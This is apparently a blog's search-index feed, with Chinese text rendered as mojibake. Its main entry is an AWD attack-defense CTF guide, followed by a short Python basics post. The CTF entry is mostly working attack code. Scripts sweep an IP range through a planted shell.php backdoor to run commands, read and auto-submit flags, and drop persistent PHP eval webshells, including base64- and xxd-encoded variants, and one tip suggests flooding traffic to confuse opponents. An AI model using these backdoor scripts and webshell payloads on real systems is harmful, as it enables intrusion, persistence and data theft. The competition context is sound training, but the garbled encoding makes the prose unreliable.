href="https://www.wlhhlc.top/posts/16692/">AoiAWD-èŒæ–°çš„å¾—åˆ†åˆ©å™¨</a></p><p>ä¸‹è½½å¥½ï¼Œè‡ªå·±å»ç¼–è¯‘æˆ–è€…æ‰¾ç¼–è¯‘å¥½çš„ç›´æ¥ç”¨</p><h2 id="é˜²å¾¡æ…å±"><a href="#é˜²å¾¡æ…å±" class="headerlink" title="é˜²å¾¡æ…å±"></a>é˜²å¾¡æ…å±</h2><p>åœ¨åŠ å›ºé˜¶æ®µï¼Œæ¯ä¸ªå ¡å’æœºéƒ½æœ‰ä¸€ä¸ªWebåœ¨è¿è¡Œã€‚è€Œè¿™äº›ç«™ç‚¹å¯èƒ½å­˜åœ¨ç›¸åº”çš„æ¼æ´å’Œåé—¨ã€‚åŸºæœ¬ä¸Šéƒ½ä¼šæœ‰shellç•™åœ¨éšç§˜çš„è§’è½â€¦</p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‰æœŸæœå¯»åˆ°çš„åé—¨ï¼Œè¿›è¡Œæ“ä½œã€‚è¿™é‡Œç›´æ¥ç”¨linuxçš„é˜²ç«å¢™è¿›è¡Œå…³é—­å³å¯ã€‚</p><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼šè¿™æ ·çš„è¯å°±ç›´æ¥æŠŠç³»ç»Ÿçš„åé—¨å…¨æ€æ‰äº†ã€‚åªå…è®¸22 80 21ç«¯å£å¯ä»¥è¿›è¡Œè®¿é—®ã€‚</p><p>é¦–å…ˆå¼€å¯ 22 80 21</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure><p>ç„¶åå…³é—­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure><p>åœ¨æ‰‹åŠ¨ä¸€ä¸ªä¸ªè¿shellæ…shiçš„è¯ï¼Œæ˜¯éå¸¸æ…¢çš„ã€‚äºæ˜¯å†™äº†ä¸ªå°è„šæœ¬ã€‚</p><p>éå†æ•´ä¸ªIPæ®µï¼Œå¹¶å°†é˜²ç«å¢™å¼€å¯å…¨éƒ¨å±è”½æ‰~~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;&lt;http://192.168.182&gt;&quot;</span><br><span class="line">port=&#x27;80&#x27;</span><br><span class="line">shell = &quot;/shell.php&quot;</span><br><span class="line">passwd = &quot;a&quot;</span><br><span class="line">payloads = &#123;</span><br><span class="line">    passwd:&quot;system(\\&#x27;iptables -A INPUT -j DROP&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,254):</span><br><span class="line">    urls = url+&quot;.&quot;+str(i)+&quot;:&quot;+port+shell</span><br><span class="line">    print(urls+&quot;\\n&quot;)</span><br><span class="line">    try:</span><br><span class="line">        res = requests.post(urls,payloads,timeout=1)</span><br><span class="line">        print(res.text)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;æœªæ‰¾åˆ°ä¸»æœº&quot;)</span><br></pre></td></tr></table></figure><h1 id="ç¼–å†™æ‰¹é‡è„šæœ¬"><a href="#ç¼–å†™æ‰¹é‡è„šæœ¬" class="headerlink" title="ç¼–å†™æ‰¹é‡è„šæœ¬"></a>ç¼–å†™æ‰¹é‡è„šæœ¬</h1><p>ä»¥ä¸‹è„šæœ¬æ¥è‡ªäºæˆ‘æ¯”èµ›æ—¶å†™çš„åƒåœ¾è„šæœ¬ï¼Œå¤§ä½¬å‹¿å–·ã€‚</p><h3 id="1-åˆ©ç”¨åé—¨getflag"><a href="#1-åˆ©ç”¨åé—¨getflag" class="headerlink" title="1.åˆ©ç”¨åé—¨getflag"></a>1.åˆ©ç”¨åé—¨getflag</h3><p>å•ä¸ªshellè·å–flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&lt;http://192.168.182.130/include/shell.php&gt;&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res=requests.post(url,payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="2-åé—¨æ‰¹é‡getflag"><a href="#2-åé—¨æ‰¹é‡getflag" class="headerlink" title="2.åé—¨æ‰¹é‡getflag"></a>2.åé—¨æ‰¹é‡getflag</h3><p>é’ˆå¯¹ç«¯å£å˜åŒ–åˆ©ç”¨åé—¨æ‰¹é‡è·å–flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url1=&quot;&lt;http://192.168.182.130&gt;:&quot;</span><br><span class="line">url2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">flaglist=[]</span><br><span class="line"></span><br><span class="line">path=&quot;/include/shell.php&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">#payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">for url2 in range(8801,8805):</span><br><span class="line">    url = url1 + str(url2) +path</span><br><span class="line"></span><br><span class="line">    res=requests.post(url,payload)</span><br><span class="line">    try:</span><br><span class="line">        print(url1 + str(url2),res.text)</span><br><span class="line">        # flagå­˜å…¥åˆ—è¡¨ä¸­</span><br><span class="line">        flaglist.append(str(res.text))</span><br><span class="line">        #print(flaglist[i])</span><br><span class="line">        i += 1</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h3 id="3-åˆ©ç”¨åé—¨æ‰¹é‡getflagå¹¶æäº¤"><a href="#3-åˆ©ç”¨åé—¨æ‰¹é‡getflagå¹¶æäº¤" class="headerlink" title="3.åˆ©ç”¨åé—¨æ‰¹é‡getflagå¹¶æäº¤"></a>3.åˆ©ç”¨åé—¨æ‰¹é‡getflagå¹¶æäº¤</h3><p>burpæŠ“åŒ…ï¼Œå‘ç°flagä»¥jsonå½¢å¼ä¼ è¾“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/flag HTTP/1.1</span><br><span class="line">Host: 192.168.182.130:39999</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Authorization: 9ad36c305d6a2d2514434a4c10e7e13f</span><br><span class="line">Content-Length: 55</span><br><span class="line">Origin: &lt;http://192.168.182.130:39999&gt;</span><br><span class="line">Connection: close</span><br><span class="line">Referer: &lt;http://192.168.182.130:39999/&gt;</span><br><span class="line"></span><br><span class="line">&#123;&quot;flag&quot;:&quot;SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬è‡ªåŠ¨è·å–flagå¹¶æäº¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url1=&quot;&lt;http://xxxx&gt;:&quot;</span><br><span class="line">url2=&quot;&quot;</span><br><span class="line"></span><br><span class="line">flaglist=[]</span><br><span class="line"></span><br><span class="line">path=&quot;/include/shell.php&quot;</span><br><span class="line">passwd=&quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">flagadd=&quot;&lt;http://xxxx:8801/api/flag&gt;&quot;   #æäº¤flagçš„åœ°å€</span><br><span class="line"></span><br><span class="line">#payload = &#123;passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">payload = &#123;passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">headersflag=&#123;</span><br><span class="line">        &#x27;Host&#x27;: &#x27;xxxx&#x27;,</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;,</span><br><span class="line">        &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/json;charset=utf-8&#x27;,</span><br><span class="line">        &#x27;Authorization&#x27;: &#x27;bada82467423a6526d4d25abbe8cc43a&#x27;,</span><br><span class="line">        &#x27;Origin&#x27;: &#x27;&lt;http://xxxx&gt;&#x27;,</span><br><span class="line">        &#x27;Referer&#x27;: &#x27;&lt;http://xxxx/&gt;&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">for url2 in range(8802,8810):</span><br><span class="line">    url = url1 + str(url2) +path</span><br><span class="line">    #print(url1 + str(url2))</span><br><span class="line">    res=requests.post(url,payload, headers=headers)</span><br><span class="line">    try:</span><br><span class="line">        print(url1 + str(url2),res.text)</span><br><span class="line">        # flagå­˜å…¥åˆ—è¡¨ä¸­</span><br><span class="line">        flaglist.append(str(res.text))</span><br><span class="line">        #print(flaglist[i])</span><br><span class="line">        body = &#123;&quot;flag&quot;: str(flaglist[i])&#125;</span><br><span class="line">        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))</span><br><span class="line">        i += 1</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>å¦‚æœå«Œå†™è„šæœ¬éº»çƒ¦ï¼Œå¯ä»¥æŠŠflagå­˜å…¥å­—å…¸ï¼Œåˆ©ç”¨burpçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥å®ç°æ‰¹é‡æäº¤flagã€‚ä¸è¿‡å¤§æ‹¬å·<code>&#123;&#125;</code>å¯èƒ½ä¼šè¢«ç¼–ç å¯¼è‡´flagé”™è¯¯ã€‚</p><h3 id="4-åˆ©ç”¨åé—¨å†™shell"><a href="#4-åˆ©ç”¨åé—¨å†™shell" class="headerlink" title="4.åˆ©ç”¨åé—¨å†™shell"></a>4.åˆ©ç”¨åé—¨å†™shell</h3><p>é¢„ç•™åé—¨å¯èƒ½ä¼šè¢«åˆ é™¤ï¼Œè¦æƒ³æŒç»­æ‹¿åˆ†éœ€è¦å†™shellï¼Œè¿™é‡Œåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œæ¥å†™é©¬</p><p><strong>åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå†™é©¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.Linuxä¸‹å†™shell</span><br><span class="line">$ echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br><span class="line">$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64ç¼–ç ç»•è¿‡</span><br><span class="line">$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxdç»•è¿‡</span><br><span class="line"></span><br><span class="line">2.windowsä¸‹å†™shell</span><br><span class="line">&gt;echo ^&lt;?php eval($^_POST[123]); ?^&gt; &gt; webshell.php</span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨ä»£ç æ‰§è¡Œå†™é©¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?code=fputs(fopen(&#x27;./webshell.php.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">?code=file_put_contents(&#x27;webshell.php.php&#x27;, &#x27;&lt;?php @eval($_POST[123]); ?&gt; &#x27;);</span><br><span class="line"></span><br><span class="line">?code=file_put_contents($_POST[f], $_POST[d]);</span><br><span class="line">post: f=webshell.php&amp;d=&lt;?php @eval($_POST[123]); ?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è„šæœ¬å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;&lt;http://192.168.182.130:8808&gt;&quot;</span><br><span class="line"></span><br><span class="line">shell_path = url + &quot;/include/shell.php&quot;</span><br><span class="line">shell_passwd = &quot;admin_ccmd&quot;</span><br><span class="line"></span><br><span class="line">#åˆ©ç”¨é¢„ç•™åé—¨</span><br><span class="line">payload = &#123;shell_passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(shell_path, payload)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">#payload1åˆ©ç”¨é¢„ç•™åé—¨ä¸Šä¼ shell</span><br><span class="line">payload1 = &#123;shell_passwd: &#x27;system(\\&#x27;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx.php\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(shell_path, payload1)</span><br><span class="line">print(&quot;shellå·²ä¸Šä¼ &quot;)</span><br><span class="line"></span><br><span class="line">#payload2åˆ©ç”¨é¢„ç•™åé—¨ä¸Šä¼ shellï¼Œå¹¶getflag</span><br><span class="line">my_shell_path = url + &quot;/atkx.php&quot;</span><br><span class="line">my_shell_passwd = &quot;atkx&quot;</span><br><span class="line">payload2 = &#123;my_shell_passwd: &#x27;system(\\&#x27;cat /f*\\&#x27;);&#x27;&#125;</span><br><span class="line">res = requests.post(my_shell_path, payload2)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>æ‰¹é‡åé—¨å†™shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url_head=&quot;&lt;http://192.168.182.130&gt;&quot;</span><br><span class="line">for url2 in range(8801,8805):</span><br><span class="line">    try:</span><br><span class="line">        url =  url_head+&quot;:&#123;&#125;&quot;.format(url2)</span><br><span class="line"></span><br><span class="line">        shell_path = url + &quot;/include/shell.php&quot;</span><br><span class="line">        shell_passwd = &quot;admin_ccmd&quot;</span><br><span class="line">        print(shell_path)</span><br><span class="line"></span><br><span class="line">        #payload1åˆ©ç”¨é¢„ç•™åé—¨ä¸Šä¼ shell</span><br><span class="line">        payload1 = &#123;shell_passwd: &#x27;system(\\&#x27;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx1.php\\&#x27;);&#x27;&#125;</span><br><span class="line">        res = requests.post(shell_path, payload1)</span><br><span class="line">        print(url + &quot; shellå†™å…¥æˆåŠŸï¼ï¼ï¼ï¼ï¼ï¼ï¼&quot;)</span><br><span class="line">        #</span><br><span class="line"></span><br><span class="line">        # #payload2é€šè¿‡ä¸Šä¼ çš„shellæ¥getflag</span><br><span class="line">        # my_shell_path = url + &quot;/atkx1.php&quot;</span><br><span class="line">        # my_shell_passwd = &quot;atkx&quot;</span><br><span class="line">        # payload2 = &#123;my_shell_passwd: &#x27;system(\\&#x27;cat /flag\\&#x27;);&#x27;&#125;</span><br><span class="line">        # res = requests.post(my_shell_path, payload2)</span><br><span class="line">        # print(url,res.text)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>1.é¢„ç•™åé—¨çš„æƒé™ç»´æŒç‰¹åˆ«é‡è¦ï¼Œä¸è¦æ€¥ç€æ‹¿flagï¼Œå¾€åæ¯ä¸€è½®é¢„ç•™åé—¨éƒ½ä¼šå‡å°‘ã€‚</p><p>2.AWDä¸€èˆ¬ä½¿ç”¨çš„æ˜¯cmsï¼Œå°½é‡å¤šæ”¶é›†ä¸€äº›cmsçš„POCå’ŒEXPï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚</p><p>3.é˜²å®ˆæ³¨æ„æŸ¥çœ‹æ—¥å¿—çœ‹åˆ«äººæ˜¯æ€ä¹ˆæ”»å‡»è‡ªå·±çš„ï¼Œç„¶åå°è¯•æ”»å‡»å…¶ä»–äººï¼Œä¸ºäº†å¹²æ‰°åˆ«äººï¼Œå¯ä»¥å…ˆæ‰“ä¸€æ³¢æµé‡ï¼Œæ··æ·†è§†å¬ã€‚</p><p>4.æ£€æŸ¥åé—¨ï¼Œä¿è¯è‡ªå·±çš„ç½‘ç«™ä¸Šæ²¡æœ‰dç›¾å¯ä»¥æ‰«å‡ºæ¥çš„åé—¨ï¼Œæ£€æŸ¥è®¡åˆ’ä»»åŠ¡æˆ–è€…å¯ç–‘è¿›ç¨‹ã€‚</p><p>5.æ¯”èµ›ä¸€è½®å¤§æ¦‚å‡ åˆ†é’Ÿï¼Œæ—¶é—´æ¯”è¾ƒç´§å¼ ï¼Œéœ€è¦æé«˜è‡ªå·±çš„ä»£ç å®¡è®¡èƒ½åŠ›ä»¥åŠè‡ªåŠ¨åŒ–è„šæœ¬çš„ç¼–å†™èƒ½åŠ›ï¼Œå®ç°è‡ªåŠ¨åŒ–æ”»å‡»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> awd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢</title>
      <link href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="pythonåŸºç¡€"><a href="#pythonåŸºç¡€" class="headerlink" title="pythonåŸºç¡€"></a>pythonåŸºç¡€</h1><h1 id="ä¸€ã€æ•°å­¦è®¡ç®—ç¬¦"><a href="#ä¸€ã€æ•°å­¦è®¡ç®—ç¬¦" class="headerlink" title="ä¸€ã€æ•°å­¦è®¡ç®—ç¬¦"></a>ä¸€ã€æ•°å­¦è®¡ç®—ç¬¦</h1><p>1.+åŠ  -å‡ *ä¹˜ /é™¤ //æ•´é™¤ %ä½™æ•° **å¹‚æŒ‡æ•°</p><p>2.å˜é‡ï¼špythonçš„å®¹å™¨ï¼Œè·Ÿprintå‡½æ•°ï¼ˆæ‰“å°æ•°æ®ç±»å‹åŠå‡½æ•°å¯¹è±¡ï¼‰</p><p>å¼‚æ›²åŒå·¥ï¼šå˜é‡å¯ä»¥å­˜æ”¾æ•°æ®ç±»å‹åŠå‡½æ•°å¯¹è±¡ï¼Œç®€çŸ­çš„ä»£ç ï¼ˆç»“æœä¹Ÿå±äºPythonä¸­çš„æ•°æ®ç±»å‹ï¼‰</p><p>ä½¿ç”¨å˜é‡æ¥å­˜æ”¾å­—ç¬¦ä¸²åŠæ•°å€¼</p><p>å­˜æ”¾çš„è¿‡ç¨‹åœ¨Pythonä¸­å«â€™èµ‹å€¼â€™ï¼Œèµ‹å€¼å°±æ˜¯=ç¬¦å·ï¼Œä¸æ˜¯æ•°å­¦ä¸­çš„ç­‰äº</p><p>Pythonä¸­çš„ç­‰äºæ˜¯â€==â€ï¼Œèµ‹å€¼æ˜¯â€=â€ï¼Œä¸€ä¸ªâ€™=â€™å«èµ‹å€¼ï¼Œä¸¤ä¸ªâ€==â€å«ç­‰äº</p><p>egï¼š1.</p><p>a=â€™å°è®¸â€™  b=3  c=3+4</p><p>print(c)</p><ol><li></li></ol><p>2==2</p><p>true å¸ƒå°”å€¼å°±æ˜¯ç”±æ¡ä»¶åˆ¤æ–­å¾—åˆ°çš„</p><p>å˜é‡ï¼Œå¸®åŠ©æˆ‘ä»¬å‡å°‘ä»£ç çš„å¤æ‚æ€§ï¼Œå¢å¼ºå¯è¯»æ€§ï¼Œä¸ç®¡ç”¨æˆ·è¾“å…¥ä»€ä¹ˆéƒ½ä¸ä¼šå½±å“æˆ‘ä»¬æå‰å†™å¥½ä»£ç </p><h1 id="äºŒã€å‘½å"><a href="#äºŒã€å‘½å" class="headerlink" title="äºŒã€å‘½å"></a>äºŒã€å‘½å</h1><p>å‘½åï¼šé‡‡ç”¨é©¼å³°å‘½åæ³•ï¼Œå­—æ¯å¼€å¤´(å°å†™)ï¼Œä¸‹æ¢çº¿ç»“å°¾</p>]]></content>
      
      
      <categories>
          
          <category> æ„¿æœ›æœŸè®¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¬¬ä¸€ç¯‡ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
